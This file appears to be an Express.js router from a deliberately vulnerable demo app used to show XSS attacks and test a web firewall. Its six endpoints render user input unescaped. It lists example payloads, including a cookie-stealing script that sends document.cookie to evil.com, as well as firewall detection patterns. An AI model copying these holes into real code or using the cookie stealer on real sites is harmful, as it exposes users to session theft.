const express = require('express');
const router = express.Router();

/**
 * ============================================
 * CROSS-SITE SCRIPTING (XSS) VULNERABILITIES
 * ============================================
 * 
 * These endpoints demonstrate reflected and stored XSS attacks.
 * 
 * WHY THEY SUCCEED WITHOUT FIREWALL:
 * - No input sanitization or encoding
 * - Direct reflection of user input in responses
 * - Unsanitized data stored in database and rendered
 * 
 * WHY FIREWALL/WAF BLOCKS THEM:
 * - Detects <script> tags and JavaScript event handlers
 * - Identifies XSS patterns (onerror, onload, javascript:)
 * - Blocks encoded and obfuscated XSS payloads
 * - Catches DOM-based XSS vectors
 */

// ============================================
// ENDPOINT 1: Reflected XSS (Search)
// ============================================
// Attack: GET /api/xss/search?q=<script>alert('XSS')</script>
// Result: JavaScript executes in response
router.get('/search', (req, res) => {
  const searchQuery = req.query.q;

  console.log(`[XSS ATTEMPT] Reflected XSS in search: ${searchQuery}`);

  // VULNERABLE: Direct reflection without encoding
  res.send(`
    <html>
      <head><title>Search Results</title></head>
      <body>
        <h1>Search Results for: ${searchQuery}</h1>
        <p>Your search for "${searchQuery}" returned 0 results.</p>
        <p style="color: red;">⚠️ This endpoint is vulnerable to Reflected XSS</p>
      </body>
    </html>
  `);
});

// ============================================
// ENDPOINT 2: Reflected XSS (Greeting)
// ============================================
// Attack: GET /api/xss/greet?name=<img src=x onerror=alert('XSS')>
// Result: XSS via image tag error handler
router.get('/greet', (req, res) => {
  const name = req.query.name || 'Guest';

  console.log(`[XSS ATTEMPT] Reflected XSS in greeting: ${name}`);

  // VULNERABLE: No escaping of HTML special characters
  res.json({
    html: `<div>Hello, ${name}!</div>`,
    vulnerability: 'Reflected XSS',
    example_attack: '?name=<img src=x onerror=alert(document.cookie)>',
    note: 'Use the html field in a web page to trigger XSS'
  });
});

// ============================================
// ENDPOINT 3: Stored XSS (Comments)
// ============================================
// Attack: POST /api/xss/comment with {"username": "Hacker", "comment": "<script>alert('Stored XSS')</script>"}
// Result: Malicious script stored in database
router.post('/comment', (req, res) => {
  const { username, comment } = req.body;
  const db = req.app.locals.db;

  console.log(`[XSS ATTEMPT] Stored XSS in comment: ${comment}`);

  // VULNERABLE: Store unsanitized user input
  db.run('INSERT INTO comments (username, comment) VALUES (?, ?)', 
    [username, comment], 
    function(err) {
      if (err) {
        return res.status(500).json({ error: err.message });
      }
      res.json({ 
        success: true,
        id: this.lastID,
        message: 'Comment posted',
        vulnerability: 'Stored XSS - malicious content saved to database',
        example_attack: '{"username": "Attacker", "comment": "<script>fetch(\'http://evil.com?cookie=\'+document.cookie)</script>"}'
      });
    }
  );
});

// ============================================
// ENDPOINT 4: View Comments (Stored XSS Trigger)
// ============================================
// Attack: GET /api/xss/comments (after posting malicious comment)
// Result: Executes stored XSS payload when viewing comments
router.get('/comments', (req, res) => {
  const db = req.app.locals.db;

  db.all('SELECT * FROM comments ORDER BY timestamp DESC', [], (err, rows) => {
    if (err) {
      return res.status(500).json({ error: err.message });
    }

    // VULNERABLE: Renders unsanitized comments
    let html = `
      <html>
        <head>
          <title>Comments</title>
          <style>
            body { font-family: Arial, sans-serif; margin: 20px; }
            .comment { border: 1px solid #ccc; padding: 10px; margin: 10px 0; }
            .warning { color: red; font-weight: bold; }
          </style>
        </head>
        <body>
          <h1>User Comments</h1>
          <p class="warning">⚠️ This page is vulnerable to Stored XSS</p>
    `;

    rows.forEach(row => {
      // VULNERABLE: Direct HTML injection
      html += `
        <div class="comment">
          <strong>${row.username}</strong> (${row.timestamp})<br>
          ${row.comment}
        </div>
      `;
    });

    html += `
        </body>
      </html>
    `;

    console.log(`[XSS TRIGGER] Rendering ${rows.length} comments (potentially malicious)`);

    res.send(html);
  });
});

// ============================================
// ENDPOINT 5: DOM-based XSS Simulation
// ============================================
// Attack: GET /api/xss/redirect?url=javascript:alert('XSS')
// Result: JavaScript URL executed
router.get('/redirect', (req, res) => {
  const url = req.query.url || '/';

  console.log(`[XSS ATTEMPT] DOM XSS via redirect: ${url}`);

  // VULNERABLE: Dangerous redirect without validation
  res.send(`
    <html>
      <head><title>Redirecting...</title></head>
      <body>
        <p>Redirecting to: ${url}</p>
        <p style="color: red;">⚠️ DOM-based XSS vulnerability</p>
        <script>
          // VULNERABLE: Direct use of user input in JavaScript
          window.location = "${url}";
        </script>
      </body>
    </html>
  `);
});

// ============================================
// ENDPOINT 6: JSON XSS
// ============================================
// Attack: GET /api/xss/user?id=</script><script>alert('XSS')</script>
// Result: XSS in JSON response embedded in HTML
router.get('/user', (req, res) => {
  const userId = req.query.id;

  console.log(`[XSS ATTEMPT] JSON XSS: ${userId}`);

  // VULNERABLE: No content-type enforcement or escaping
  res.send(`
    <html>
      <head><title>User Profile</title></head>
      <body>
        <h1>User Profile</h1>
        <script>
          // VULNERABLE: Injecting user input into JavaScript context
          var userId = "${userId}";
          document.write("<p>Loading user: " + userId + "</p>");
        </script>
        <p style="color: red;">⚠️ JSON/JavaScript context XSS</p>
      </body>
    </html>
  `);
});

// Info endpoint
router.get('/', (req, res) => {
  res.json({
    category: 'Cross-Site Scripting (XSS) Vulnerabilities',
    description: 'Demonstrates reflected, stored, and DOM-based XSS attacks',
    endpoints: {
      'GET /api/xss/search?q=': 'Reflected XSS in search results',
      'GET /api/xss/greet?name=': 'Reflected XSS in greeting',
      'POST /api/xss/comment': 'Stored XSS via comments',
      'GET /api/xss/comments': 'Trigger stored XSS payloads',
      'GET /api/xss/redirect?url=': 'DOM-based XSS',
      'GET /api/xss/user?id=': 'XSS in JavaScript context'
    },
    example_payloads: {
      basic_script: '<script>alert("XSS")</script>',
      img_tag: '<img src=x onerror=alert(document.cookie)>',
      javascript_url: 'javascript:alert("XSS")',
      event_handler: '<body onload=alert("XSS")>',
      cookie_stealer: '<script>fetch("http://evil.com?c="+document.cookie)</script>'
    },
    firewall_detection: [
      '<script> tags',
      'JavaScript event handlers (onerror, onload)',
      'javascript: protocol',
      'Encoded XSS patterns',
      'HTML injection attempts'
    ]
  });
});

module.exports = router;
